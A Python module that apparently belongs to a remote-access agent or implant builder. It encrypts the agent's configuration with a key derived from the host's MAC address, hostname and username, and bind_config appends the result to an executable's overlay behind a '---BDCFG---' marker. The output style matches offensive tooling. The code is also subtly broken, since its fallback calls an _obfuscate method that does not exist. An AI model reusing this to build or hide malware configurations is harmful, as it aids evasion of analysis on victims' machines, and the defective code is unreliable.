"""Encrypted configuration storage for the agent."""
import os
import json
import base64
import hashlib
import uuid

class ConfigProtector:
    """Encrypts agent configuration with machine-derived key material."""

    def __init__(self, key=None):
        self._key = key if key else self._derive_machine_key()

    @staticmethod
    def _derive_machine_key():
        """Derive an AES-256 key from hostname, MAC, and username."""
        seed = ''
        try:
            seed += hex(uuid.getnode())
        except Exception:
            seed += '00:00:00:00:00:00'
        try:
            seed += os.uname().nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME', '')
        except Exception:
            seed += os.environ.get('COMPUTERNAME', 'unknown')
        try:
            import getpass
            seed += getpass.getuser()
        except Exception:
            seed += 'user'
        return hashlib.sha256(seed.encode()).digest()

    def encrypt_config(self, config_dict):
        """AES-256 encrypt a config dict, returning base64."""
        plain = json.dumps(config_dict).encode()
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            iv = os.urandom(16)
            cipher = AES.new(self._key, AES.MODE_CBC, iv)
            return base64.b64encode(iv + cipher.encrypt(pad(plain, AES.block_size))).decode()
        except ImportError:
            return self._obfuscate(plain)

    def decrypt_config(self, encrypted_str):
        try:
            raw = base64.b64decode(encrypted_str)
        except Exception:
            try:
                return json.loads(self._deobfuscate(encrypted_str).decode())
            except Exception:
                return {}
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad
            iv, ct = raw[:16], raw[16:]
            plain = unpad(AES.new(self._key, AES.MODE_CBC, iv).decrypt(ct), AES.block_size)
        except Exception:
            return {}
        return json.loads(plain.decode())

    def _deobfuscate(self, data):
        if isinstance(data, bytes):
            data = data.decode(errors='replace')
        try:
            salt, encoded = data.split(':', 1)
        except ValueError:
            return b''
        key = hashlib.sha256((self._key.hex() + salt).encode()).digest()
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(base64.b64decode(encoded))])

    def save_config(self, config_dict, path):
        """Encrypt and save config to a file."""
        with open(path, 'w') as f:
            f.write(self.encrypt_config(config_dict))
        return f'[+] Config saved to {path}'

    def load_config(self, path):
        """Load and decrypt config from a file."""
        with open(path, 'r') as f:
            return self.decrypt_config(f.read())

def bind_config(config_path, exe_path):
    """Append encrypted config to the overlay of an EXE."""
    if not os.path.isfile(config_path) or not os.path.isfile(exe_path):
        return '[-] Both config_path and exe_path must exist'
    with open(config_path, 'r') as f:
        cfg = f.read()
    sep = '\n---BDCFG---\n'
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    if sep.encode() in exe_data:
        exe_data = exe_data.split(sep.encode())[0]
    with open(exe_path, 'wb') as f:
        f.write(exe_data + sep.encode() + cfg.encode())
    return f'[+] Config bound to {exe_path}'
